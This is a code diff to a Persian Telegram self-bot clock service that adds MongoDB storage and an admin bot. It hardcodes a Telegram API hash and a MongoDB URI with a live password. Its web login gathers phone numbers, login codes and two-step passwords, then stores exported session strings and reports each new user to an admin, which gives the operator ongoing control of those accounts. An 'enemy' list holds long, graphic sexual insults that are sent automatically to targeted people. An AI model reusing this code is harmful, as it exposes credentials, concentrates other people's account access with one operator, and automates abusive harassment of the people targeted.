@@ -6,8 +6,9 @@ import aiohttp
 from urllib.parse import quote
 import html
 from pyrogram import Client, filters
-from pyrogram.handlers import MessageHandler
+from pyrogram.handlers import MessageHandler, CallbackQueryHandler
 from pyrogram.enums import ChatType
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.errors import (
     FloodWait, SessionPasswordNeeded, PhoneCodeInvalid,
     PasswordHashInvalid, PhoneNumberInvalid, PhoneCodeExpired, UserDeactivated, AuthKeyUnregistered,
@@ -18,6 +19,8 @@ from zoneinfo import ZoneInfo
 from flask import Flask, request, render_template_string, redirect, session, url_for
 from threading import Thread
 import random
+# کتابخانه لازم برای اتصال به MongoDB
+from motor.motor_asyncio import AsyncIOMotorClient
 
 # --- تنظیمات لاگ‌نویسی ---
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s - %(message)s')
@@ -27,11 +30,36 @@ logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s - %(
 # =======================================================
 API_ID = 28190856
 API_HASH = "6b9b5309c2a211b526c6ddad6eabb521"
+# --- تنظیمات ربات ادمین (این مقادیر را در Environment Variables در Render قرار دهید) ---
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
+
+
+# --- تنظیمات پایگاه داده ---
+MONGO_URI = "mongodb+srv://a10247014_db_user:P1ikUZuHNUl8TcMr@cluster0.vpbcosg.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
+db_client = None
+users_collection = None
+
+if MONGO_URI:
+    try:
+        db_client = AsyncIOMotorClient(MONGO_URI)
+        db = db_client.self_bot
+        users_collection = db.users
+        logging.info("Successfully connected to MongoDB.")
+    except Exception as e:
+        logging.error(f"Failed to connect to MongoDB: {e}")
+        MONGO_URI = None # Disable DB features if connection fails
+else:
+    logging.warning("MONGO_URI environment variable not found. Database features will be disabled.")
+
 
 # --- متغیرهای برنامه ---
 TEHRAN_TIMEZONE = ZoneInfo("Asia/Tehran")
 app_flask = Flask(__name__)
 app_flask.secret_key = os.environ.get("FLASK_SECRET_KEY", os.urandom(24))
+admin_bot = None
+if BOT_TOKEN:
+    admin_bot = Client("admin_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
 
 # --- دیکشنری فونت‌ها برای ساعت ---
 FONT_STYLES = {
@@ -51,8 +79,8 @@ ALL_DIGITS = "".join(set(char for font in FONT_STYLES.values() for char in font.
 # --- متغیرهای مربوط به قابلیت‌ها ---
 ENEMY_REPLIES = [
    "کیرم تو رحم اجاره ای و خونی مالی مادرت", "دو میلیون شبی پول ویلا بدم تا مادرتو تو گوشه کناراش بگام و اب کوسشو بریزم کف خونه تا فردا صبح کارگرای افغانی برای نظافت اومدن با بوی اب کس مادرت بجقن و ابکیراشون نثار قبر مرده هات بشه", "احمق مادر کونی من کس مادرت گذاشتم تو بازم داری کسشر میگی", "هی بیناموس کیرم بره تو کس ننت واس بابات نشآخ مادر کیری کیرم بره تو کس اجدادت کسکش بیناموس کس ول نسل شوتی ابجی کسده کیرم تو کس مادرت بیناموس کیری کیرم تو کس نسلت ابجی کونی کس نسل سگ ممبر کونی ابجی سگ ممبر سگ کونی کیرم تو کس ننت کیر تو کس مادرت کیر خاندان  تو کس نسلت مادر کونی ابجی کونی کیری ناموس ابجیتو گاییدم سگ حرومی خارکسه مادر کیری با کیر بزنم تو رحم مادرت ناموستو بگام لاشی کونی ابجی کس  خیابونی مادرخونی ننت کیرمو میماله تو میای کص میگی شاخ نشو ییا ببین شاخو کردم تو کون ابجی جندت کس ابجیتو پاره کردم تو شاخ میشی اوبی",
-    "کیرم تو کس سیاه مادرت خارکصده", "حروم زاده باک کص ننت با ابکیرم پر میکنم", "منبع اب ایرانو با اب کص مادرت تامین میکنم", "خارکسته میخای مادرتو بگام بعد بیای ادعای شرف کنی کیرم تو شرف مادرت",
-    "کیرم تویه اون خرخره مادرت بیا اینحا ببینم تویه نوچه کی دانلود شدی کیفیتت پایینه صدات نمیاد فقط رویه حالیت بی صدا داری امواج های بی ارزش و بیناموسانه از خودت ارسال میکنی که ناگهان دیدی من روانی شدم دست از پا خطا کردم با تبر کائنات کوبیدم رو سر مادرت نمیتونی مارو تازه بالقه گمان کنی", "کیرم تویه اون خرخره مادرت بیا اینحا ببینم تویه نوچه کی دانلود شدی کیفیتت پایینه صدات نمیاد فقط رویه حالیت بی صدا داری امواج های بی ارزش و بیناموسانه از خودت ارسال میکنی که ناگهان دیدی من روانی شدم دست از پا خطا کردم با تبر کائنات کوبیدم رو سر مادرت نمیتونی مارو تازه بالقه گمان کنی",
+   "کیرم تو کس سیاه مادرت خارکصده", "حروم زاده باک کص ننت با ابکیرم پر میکنم", "منبع اب ایرانو با اب کص مادرت تامین میکنم", "خارکسته میخای مادرتو بگام بعد بیای ادعای شرف کنی کیرم تو شرف مادرت",
+   "کیرم تویه اون خرخره مادرت بیا اینحا ببینم تویه نوچه کی دانلود شدی کیفیتت پایینه صدات نمیاد فقط رویه حالیت بی صدا داری امواج های بی ارزش و بیناموسانه از خودت ارسال میکنی که ناگهان دیدی من روانی شدم دست از پا خطا کردم با تبر کائنات کوبیدم رو سر مادرت نمیتونی مارو تازه بالقه گمان کنی", "کیرم تویه اون خرخره مادرت بیا اینحا ببینم تویه نوچه کی دانلود شدی کیفیتت پایینه صدات نمیاد فقط رویه حالیت بی صدا داری امواج های بی ارزش و بیناموسانه از خودت ارسال میکنی که ناگهان دیدی من روانی شدم دست از پا خطا کردم با تبر کائنات کوبیدم رو سر مادرت نمیتونی مارو تازه بالقه گمان کنی",
 ]
 SECRETARY_REPLY_MESSAGE = "سلام! در حال حاضر آفلاین هستم و پیام شما را دریافت کردم. در اولین فرصت پاسخ خواهم داد. ممنون از پیامتون."
 HELP_TEXT = """
@@ -113,6 +141,14 @@ EVENT_LOOP = asyncio.new_event_loop()
 ACTIVE_CLIENTS = {}
 ACTIVE_BOTS = {}
 
+# --- توابع کمکی پایگاه داده ---
+async def update_db_settings(user_id, settings_update):
+    if users_collection:
+        try:
+            await users_collection.update_one({'_id': user_id}, {'$set': settings_update}, upsert=False)
+        except Exception as e:
+            logging.error(f"Could not update DB for user {user_id}: {e}")
+
 # --- توابع اصلی ربات ---
 def stylize_time(time_str: str, style: str) -> str:
     font_map = FONT_STYLES.get(style, FONT_STYLES["stylized"])
@@ -143,8 +179,11 @@ async def update_profile_clock(client: Client, user_id: int):
             now = datetime.now(TEHRAN_TIMEZONE)
             sleep_duration = 60 - now.second + 0.1
             await asyncio.sleep(sleep_duration)
-        except (UserDeactivated, AuthKeyUnregistered):
-            logging.error(f"Session for user_id {user_id} is invalid. Stopping bot.")
+        except (UserDeactivated, AuthKeyUnregistered) as e:
+            logging.error(f"Session for user_id {user_id} is invalid. Stopping bot. Reason: {e}")
+            if users_collection:
+                await users_collection.delete_one({'_id': user_id})
+                logging.info(f"Removed invalid session for user {user_id} from database.")
             break
         except FloodWait as e:
             logging.warning(f"Flood wait of {e.value}s for user_id {user_id}.")
@@ -153,11 +192,11 @@ async def update_profile_clock(client: Client, user_id: int):
             logging.error(f"An error occurred in the main loop for user_id {user_id}: {e}", exc_info=True)
             await asyncio.sleep(60)
     
-    if client.is_connected:
+    if client and client.is_connected:
         await client.stop()
     for user_dict in [ACTIVE_BOTS, ACTIVE_ENEMIES, SECRETARY_MODE_STATUS, ENEMY_REPLY_QUEUES, 
-                      USERS_REPLIED_IN_SECRETARY, MUTED_USERS, USER_FONT_CHOICES, CLOCK_STATUS, 
-                      BOLD_MODE_STATUS, AUTO_SEEN_STATUS, AUTO_REACTION_TARGETS, AUTO_TRANSLATE_STATUS]:
+                       USERS_REPLIED_IN_SECRETARY, MUTED_USERS, USER_FONT_CHOICES, CLOCK_STATUS, 
+                       BOLD_MODE_STATUS, AUTO_SEEN_STATUS, AUTO_REACTION_TARGETS, AUTO_TRANSLATE_STATUS]:
         user_dict.pop(user_id, None)
     logging.info(f"Bot for user_id {user_id} has been stopped and cleaned up.")
 
@@ -198,7 +237,6 @@ async def outgoing_message_modifier(client, message):
         except Exception as e:
             logging.warning(f"Could not modify outgoing message for user {user_id}: {e}")
     
-
 async def enemy_handler(client, message):
     user_id = client.me.id
     if user_id not in ENEMY_REPLY_QUEUES or not ENEMY_REPLY_QUEUES[user_id]:
@@ -209,7 +247,6 @@ async def enemy_handler(client, message):
         await message.reply_text(reply_text)
     except Exception as e:
         logging.warning(f"Could not reply to enemy for user_id {user_id}: {e}")
-
 
 async def secretary_auto_reply_handler(client, message):
     owner_user_id = client.me.id
@@ -226,12 +263,10 @@ async def secretary_auto_reply_handler(client, message):
             except Exception as e:
                 logging.warning(f"Could not auto-reply for user_id {owner_user_id}: {e}")
 
-
 async def incoming_message_manager(client, message):
     if not message.from_user: return
     user_id = client.me.id
     
-    # --- Step 1: Handle Auto Reaction ---
     reaction_map = AUTO_REACTION_TARGETS.get(user_id, {})
     target_key = (message.from_user.id, message.chat.id)
     if target_key in reaction_map:
@@ -240,30 +275,27 @@ async def incoming_message_manager(client, message):
             await client.send_reaction(message.chat.id, message.id, emoji)
         except ReactionInvalid:
             logging.warning(f"Invalid reaction emoji '{emoji}' for user {user_id}.")
+            if AUTO_REACTION_TARGETS.get(user_id, {}).pop(target_key, None):
+                asyncio.create_task(update_db_settings(user_id, {'auto_reaction_targets': AUTO_REACTION_TARGETS[user_id]}))
             try:
-                await client.send_message(user_id, f"⚠️ **خطا:** ایموجی `{emoji}` برای واکنش معتبر نیست و از لیست حذف شد.")
-                if AUTO_REACTION_TARGETS.get(user_id, {}).pop(target_key, None):
-                    logging.info(f"Removed invalid reaction setting for {target_key}")
+                await client.send_message(user_id, f"⚠️ **خطا:** ایموجی `{emoji}` نامعتبر بود و حذف شد.")
             except Exception as e2:
                 logging.warning(f"Could not send error message to user {user_id}: {e2}")
         except Exception as e:
             logging.warning(f"Could not send reaction for user {user_id}: {e}")
 
-    # --- Step 2: Handle Mute ---
     muted_list = MUTED_USERS.get(user_id, set())
     if (message.from_user.id, message.chat.id) in muted_list:
         try: 
             await message.delete()
             return
         except Exception as e: logging.warning(f"Could not delete muted message for owner {user_id}: {e}")
-    
 
 async def auto_seen_handler(client, message):
     user_id = client.me.id
     if AUTO_SEEN_STATUS.get(user_id, False):
         try: await client.read_chat_history(message.chat.id)
         except Exception as e: logging.warning(f"Could not mark history as read for chat {message.chat.id}: {e}")
-
 
 # --- کنترلرهای دستورات ---
 async def help_controller(client, message):
@@ -287,6 +319,7 @@ async def font_controller(client, message):
             selected_style = FONT_KEYS_ORDER[choice - 1]
             USER_FONT_CHOICES[user_id] = selected_style
             CLOCK_STATUS[user_id] = True 
+            asyncio.create_task(update_db_settings(user_id, {"font_style": selected_style, "clock_status": True}))
             await message.edit_text(f"✅ فونت به **{FONT_DISPLAY_NAMES[selected_style]}** تغییر یافت و ساعت فعال شد.")
         else:
             await message.edit_text("⚠️ عدد وارد شده معتبر نیست.")
@@ -296,9 +329,11 @@ async def clock_controller(client, message):
     command = message.text.strip()
     if command == "ساعت روشن":
         CLOCK_STATUS[user_id] = True
+        asyncio.create_task(update_db_settings(user_id, {"clock_status": True}))
         await message.edit_text("✅ ساعت پروفایل فعال شد.")
     elif command == "ساعت خاموش":
         CLOCK_STATUS[user_id] = False
+        asyncio.create_task(update_db_settings(user_id, {"clock_status": False}))
         try:
             me = await client.get_me()
             current_name = me.first_name
@@ -319,12 +354,16 @@ async def enemy_controller(client, message):
     
     if user_id not in ACTIVE_ENEMIES: ACTIVE_ENEMIES[user_id] = set()
     
+    target_tuple = (target_user.id, chat_id)
     if command == "دشمن روشن":
-        ACTIVE_ENEMIES[user_id].add((target_user.id, chat_id))
+        ACTIVE_ENEMIES[user_id].add(target_tuple)
         await message.edit_text(f"✅ **حالت دشمن برای {target_user.first_name} فعال شد.**")
     elif command == "دشمن خاموش":
-        ACTIVE_ENEMIES[user_id].discard((target_user.id, chat_id))
+        ACTIVE_ENEMIES[user_id].discard(target_tuple)
         await message.edit_text(f"❌ **حالت دشمن برای {target_user.first_name} خاموش شد.**")
+    
+    db_enemies = [{"user_id": u, "chat_id": c} for u, c in ACTIVE_ENEMIES[user_id]]
+    asyncio.create_task(update_db_settings(user_id, {"active_enemies": db_enemies}))
 
 async def block_unblock_controller(client, message):
     if not message.reply_to_message or not message.reply_to_message.from_user: return
@@ -355,6 +394,9 @@ async def mute_unmute_controller(client, message):
     elif command == "سکوت خاموش":
         MUTED_USERS[user_id].discard(target_tuple)
         await message.edit_text(f"🔊 **کاربر {target_user.first_name} از سایلنت خارج شد.**")
+    
+    db_muted = [{"user_id": u, "chat_id": c} for u, c in MUTED_USERS[user_id]]
+    asyncio.create_task(update_db_settings(user_id, {"muted_users": db_muted}))
 
 async def auto_reaction_controller(client, message):
     if not message.reply_to_message or not message.reply_to_message.from_user: return
@@ -362,7 +404,7 @@ async def auto_reaction_controller(client, message):
     target_user, chat_id = message.reply_to_message.from_user, message.chat.id
     command = message.text.strip()
     
-    target_key = (target_user.id, chat_id)
+    target_key = f"{target_user.id}_{chat_id}"
     if user_id not in AUTO_REACTION_TARGETS: AUTO_REACTION_TARGETS[user_id] = {}
 
     if command.startswith("ریاکشن") and command != "ریاکشن خاموش":
@@ -375,6 +417,8 @@ async def auto_reaction_controller(client, message):
     elif command == "ریاکشن خاموش":
         if AUTO_REACTION_TARGETS.get(user_id, {}).pop(target_key, None):
             await message.edit_text(f"❌ واکنش خودکار برای {target_user.first_name} غیرفعال شد.")
+    
+    asyncio.create_task(update_db_settings(user_id, {"auto_reaction_targets": AUTO_REACTION_TARGETS[user_id]}))
 
 async def save_message_controller(client, message):
     if not message.reply_to_message: return
@@ -414,19 +458,21 @@ async def toggle_controller(client, message):
     command = message.text.strip()
     
     toggle_map = {
-        "اینگیلیسی روشن": ("ترجمه اینگیلیسی", AUTO_TRANSLATE_STATUS, True),
-        "اینگیلیسی خاموش": ("ترجمه اینگیلیسی", AUTO_TRANSLATE_STATUS, False),
-        "بولد روشن": ("بولد خودکار", BOLD_MODE_STATUS, True),
-        "بولد خاموش": ("بولد خودکار", BOLD_MODE_STATUS, False),
-        "سین روشن": ("سین خودکار", AUTO_SEEN_STATUS, True),
-        "سین خاموش": ("سین خودکار", AUTO_SEEN_STATUS, False),
-        "منشی روشن": ("منشی", SECRETARY_MODE_STATUS, True),
-        "منشی خاموش": ("منشی", SECRETARY_MODE_STATUS, False),
+        "اینگیلیسی روشن": ("ترجمه اینگیلیسی", AUTO_TRANSLATE_STATUS, True, "auto_translate_status"),
+        "اینگیلیسی خاموش": ("ترجمه اینگیلیسی", AUTO_TRANSLATE_STATUS, False, "auto_translate_status"),
+        "بولد روشن": ("بولد خودکار", BOLD_MODE_STATUS, True, "bold_mode_status"),
+        "بولد خاموش": ("بولد خودکار", BOLD_MODE_STATUS, False, "bold_mode_status"),
+        "سین روشن": ("سین خودکار", AUTO_SEEN_STATUS, True, "auto_seen_status"),
+        "سین خاموش": ("سین خودکار", AUTO_SEEN_STATUS, False, "auto_seen_status"),
+        "منشی روشن": ("منشی", SECRETARY_MODE_STATUS, True, "secretary_mode_status"),
+        "منشی خاموش": ("منشی", SECRETARY_MODE_STATUS, False, "secretary_mode_status"),
     }
 
     if command in toggle_map:
-        feature_name, status_dict, new_status = toggle_map[command]
+        feature_name, status_dict, new_status, db_key = toggle_map[command]
         status_dict[user_id] = new_status
+        asyncio.create_task(update_db_settings(user_id, {db_key: new_status}))
+
         if command == "منشی روشن":
             USERS_REPLIED_IN_SECRETARY[user_id] = set()
         
@@ -441,20 +487,31 @@ async def is_enemy_filter(_, client, message):
 
 is_enemy = filters.create(is_enemy_filter)
 
-async def start_bot_instance(session_string: str, phone: str, font_style: str, disable_clock: bool = False):
+async def start_bot_instance(user_id: int, session_string: str, user_settings: dict):
     try:
-        client = Client(f"bot_{phone}", api_id=API_ID, api_hash=API_HASH, session_string=session_string)
-        
+        phone_number = user_settings.get("phone_number", f"user_{user_id}")
+        client = Client(f"bot_{phone_number}", api_id=API_ID, api_hash=API_HASH, session_string=session_string)
         await client.start()
-        user_id = (await client.get_me()).id
         
-        if user_id in ACTIVE_BOTS:
-            if task := ACTIVE_BOTS.pop(user_id, None): task.cancel()
-            await asyncio.sleep(1)
+        # Load settings from DB into memory
+        USER_FONT_CHOICES[user_id] = user_settings.get("font_style", "stylized")
+        CLOCK_STATUS[user_id] = user_settings.get("clock_status", True)
+        BOLD_MODE_STATUS[user_id] = user_settings.get("bold_mode_status", False)
+        AUTO_SEEN_STATUS[user_id] = user_settings.get("auto_seen_status", False)
+        SECRETARY_MODE_STATUS[user_id] = user_settings.get("secretary_mode_status", False)
+        AUTO_TRANSLATE_STATUS[user_id] = user_settings.get("auto_translate_status", False)
+        ACTIVE_ENEMIES[user_id] = set(tuple(d.values()) for d in user_settings.get("active_enemies", []))
+        MUTED_USERS[user_id] = set(tuple(d.values()) for d in user_settings.get("muted_users", []))
         
-        # Initialize settings
-        USER_FONT_CHOICES[user_id] = font_style
-        CLOCK_STATUS[user_id] = not disable_clock
+        db_reactions = user_settings.get("auto_reaction_targets", {})
+        mem_reactions = {}
+        for k, v in db_reactions.items():
+            try:
+                user_part, chat_part = map(int, k.split('_'))
+                mem_reactions[(user_part, chat_part)] = v
+            except (ValueError, AttributeError):
+                continue
+        AUTO_REACTION_TARGETS[user_id] = mem_reactions
         
         # Handlers Registration
         client.add_handler(MessageHandler(auto_seen_handler, filters.private & ~filters.me), group=-4)
@@ -475,10 +532,85 @@ async def start_bot_instance(session_string: str, phone: str, font_style: str, d
         client.add_handler(MessageHandler(enemy_handler, is_enemy & ~filters.me), group=1)
         client.add_handler(MessageHandler(secretary_auto_reply_handler, filters.private & ~filters.me), group=1)
 
+        if user_id in ACTIVE_BOTS:
+            if task := ACTIVE_BOTS.pop(user_id, None): task.cancel()
         ACTIVE_BOTS[user_id] = asyncio.create_task(update_profile_clock(client, user_id))
-        logging.info(f"Successfully started bot instance for user_id {user_id}.")
+        logging.info(f"Successfully started bot instance from DB for user_id {user_id}.")
     except Exception as e:
-        logging.error(f"FAILED to start bot instance for {phone}: {e}", exc_info=True)
+        logging.error(f"FAILED to start bot instance for user {user_id}: {e}", exc_info=True)
+        if isinstance(e, (AuthKeyUnregistered, UserDeactivated)) and users_collection:
+            await users_collection.delete_one({'_id': user_id})
+            logging.info(f"Removed invalid session for user {user_id} from database.")
+
+# --- Admin Bot Handlers ---
+async def get_users_panel():
+    """Generates the text and keyboard for the admin panel."""
+    if not users_collection:
+        return "پایگاه داده متصل نیست.", None
+    
+    users = await users_collection.find({}).to_list(length=None)
+    if not users:
+        return "هیچ کاربری متصل نیست.", None
+
+    keyboard = []
+    text = "👤 **لیست کاربران متصل:**\n\n"
+    for user in users:
+        user_id = user['_id']
+        phone = user.get('phone_number', 'N/A')
+        name = user.get('first_name', 'N/A')
+        username = user.get('username', 'N/A')
+        
+        text += f"▪️ نام: {name}\n"
+        text += f"▫️ یوزرنیم: @{username}\n"
+        text += f"📱 شماره: `{phone}`\n"
+        text += f"🆔 آیدی: `{user_id}`\n"
+        text += "-"*20 + "\n"
+        
+        keyboard.append([InlineKeyboardButton(f"❌ قطع اتصال {name}", callback_data=f"disconnect_{user_id}")])
+    
+    return text, InlineKeyboardMarkup(keyboard)
+
+async def admin_panel_handler(client, message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    text, keyboard = await get_users_panel()
+    await message.reply_text(text, reply_markup=keyboard)
+
+async def callback_query_handler(client, callback_query):
+    if callback_query.from_user.id != ADMIN_ID:
+        await callback_query.answer("شما ادمین نیستید!", show_alert=True)
+        return
+    
+    data = callback_query.data
+    
+    if data.startswith("disconnect_"):
+        try:
+            user_id_to_disconnect = int(data.split("_")[1])
+            
+            # Stop the running bot instance
+            if task := ACTIVE_BOTS.pop(user_id_to_disconnect, None):
+                task.cancel()
+                logging.info(f"Admin disconnected bot for user {user_id_to_disconnect}.")
+            
+            # Remove from database
+            result = await users_collection.delete_one({'_id': user_id_to_disconnect})
+            
+            if result.deleted_count > 0:
+                await callback_query.answer(f"کاربر {user_id_to_disconnect} با موفقیت قطع و حذف شد.", show_alert=True)
+                # Refresh the panel
+                text, keyboard = await get_users_panel()
+                await callback_query.message.edit_text(text, reply_markup=keyboard)
+            else:
+                await callback_query.answer(f"کاربر {user_id_to_disconnect} در پایگاه داده یافت نشد.", show_alert=True)
+
+        except Exception as e:
+            logging.error(f"Error during disconnect callback: {e}")
+            await callback_query.answer("خطایی رخ داد.", show_alert=True)
+
+if admin_bot:
+    admin_bot.add_handler(MessageHandler(admin_panel_handler, filters.command("admin") & filters.private))
+    admin_bot.add_handler(CallbackQueryHandler(callback_query_handler))
+
 
 # --- بخش وب (Flask) ---
 HTML_TEMPLATE = """
@@ -507,6 +639,9 @@ def login():
     action = request.form.get('action')
     phone = session.get('phone_number')
     try:
+        if not MONGO_URI and action in ['code', 'password']:
+            raise Exception("پایگاه داده متصل نیست. لطفا متغیر MONGO_URI را تنظیم کنید.")
+
         if action == 'phone':
             session['phone_number'] = request.form.get('phone_number')
             session['font_style'] = request.form.get('font_style')
@@ -530,13 +665,16 @@ def login():
             PhoneCodeExpired: "کد تایید منقضی شده، دوباره تلاش کنید.",
             FloodWait: f"محدودیت تلگرام. لطفا {getattr(e, 'value', 5)} ثانیه دیگر تلاش کنید."
         }
-        error_msg, current_step = "خطای پیش‌بینی نشده.", 'GET_PHONE'
+        error_msg = str(e)
+        current_step = 'GET_PHONE'
         for err_types, msg in error_map.items():
             if isinstance(e, err_types):
                 error_msg = msg
-                current_step = 'GET_CODE' if isinstance(e, PhoneCodeInvalid) else 'GET_PASSWORD'
-                if isinstance(e, (PhoneNumberInvalid, TypeError, PhoneCodeExpired)): current_step = 'GET_PHONE'
                 break
+        
+        if isinstance(e, PhoneCodeInvalid): current_step = 'GET_CODE'
+        elif isinstance(e, PasswordHashInvalid): current_step = 'GET_PASSWORD'
+        
         if current_step == 'GET_PHONE': session.clear()
         return render_template_string(HTML_TEMPLATE, step=current_step, error_message=error_msg, phone_number=phone, font_previews=get_font_previews())
     return redirect(url_for('home'))
@@ -548,14 +686,49 @@ async def send_code_task(phone):
     await client.connect()
     session['phone_code_hash'] = (await client.send_code(phone)).phone_code_hash
 
+async def process_successful_login(client: Client, phone: str):
+    me = await client.get_me()
+    session_str = await client.export_session_string()
+    user_id = me.id
+    
+    user_settings = {
+        "phone_number": phone,
+        "font_style": session.get('font_style', 'stylized'),
+        "clock_status": not session.get('disable_clock', False),
+        "session_string": session_str,
+        "first_name": me.first_name,
+        "username": me.username or "N/A"
+    }
+    
+    await users_collection.update_one(
+        {'_id': user_id},
+        {'$set': user_settings},
+        upsert=True
+    )
+    
+    # Notify Admin
+    if admin_bot and ADMIN_ID:
+        try:
+            admin_message = (
+                f"✅ **کاربر جدید متصل شد**\n\n"
+                f"👤 **نام:** {me.first_name}\n"
+                f"✒️ **یوزرنیم:** @{me.username}\n"
+                f"📞 **شماره:** `{phone}`\n"
+                f"🆔 **آیدی:** `{user_id}`"
+            )
+            await admin_bot.send_message(ADMIN_ID, admin_message)
+        except Exception as e:
+            logging.error(f"Could not send admin notification: {e}")
+
+    await start_bot_instance(user_id, session_str, user_settings)
+    await cleanup_client(phone)
+
 async def sign_in_task(phone, code):
     client = ACTIVE_CLIENTS.get(phone)
     if not client: raise Exception("Session expired.")
     try:
         await client.sign_in(phone, session['phone_code_hash'], code)
-        session_str = await client.export_session_string()
-        await start_bot_instance(session_str, phone, session.get('font_style'), session.get('disable_clock', False))
-        await cleanup_client(phone)
+        await process_successful_login(client, phone)
     except SessionPasswordNeeded:
         return 'GET_PASSWORD'
 
@@ -564,25 +737,63 @@ async def check_password_task(phone, password):
     if not client: raise Exception("Session expired.")
     try:
         await client.check_password(password)
-        session_str = await client.export_session_string()
-        await start_bot_instance(session_str, phone, session.get('font_style'), session.get('disable_clock', False))
+        await process_successful_login(client, phone)
     finally:
-        await cleanup_client(phone)
+        pass
 
 def run_flask():
     port = int(os.environ.get("PORT", 10000))
     app_flask.run(host='0.0.0.0', port=port)
 
+async def load_and_start_bots():
+    if not users_collection:
+        logging.warning("Skipping bot auto-start because database is not connected.")
+        return
+    
+    logging.info("Loading users from database and starting bots...")
+    try:
+        async for user_data in users_collection.find({}):
+            user_id = user_data['_id']
+            session_string = user_data.get('session_string')
+            if not session_string:
+                logging.warning(f"No session string found for user {user_id}, skipping.")
+                continue
+            
+            if user_id in ACTIVE_BOTS:
+                logging.info(f"Bot for user {user_id} is already running or starting.")
+                continue
+            
+            await start_bot_instance(user_id, session_string, user_data)
+    except Exception as e:
+        logging.error(f"An error occurred while loading bots from DB: {e}", exc_info=True)
+
+async def start_admin_bot():
+    if admin_bot:
+        try:
+            await admin_bot.start()
+            logging.info("Admin bot started successfully.")
+        except Exception as e:
+            logging.error(f"Failed to start admin bot: {e}")
+
 def run_asyncio_loop():
     try:
         asyncio.set_event_loop(EVENT_LOOP)
+        if MONGO_URI:
+            EVENT_LOOP.create_task(load_and_start_bots())
+        if BOT_TOKEN and ADMIN_ID:
+             EVENT_LOOP.create_task(start_admin_bot())
         EVENT_LOOP.run_forever()
     except (KeyboardInterrupt, SystemExit):
         pass
     finally:
+        if admin_bot and admin_bot.is_connected:
+            EVENT_LOOP.run_until_complete(admin_bot.stop())
+        logging.info("Closing asyncio event loop.")
         EVENT_LOOP.close()
 
 if __name__ == "__main__":
+    if not all([BOT_TOKEN, ADMIN_ID]):
+        logging.warning("BOT_TOKEN or ADMIN_ID is not set. Admin features will be disabled.")
     logging.info("Starting Telegram Clock Bot Service...")
     loop_thread = Thread(target=run_asyncio_loop, daemon=True)
     loop_thread.start()
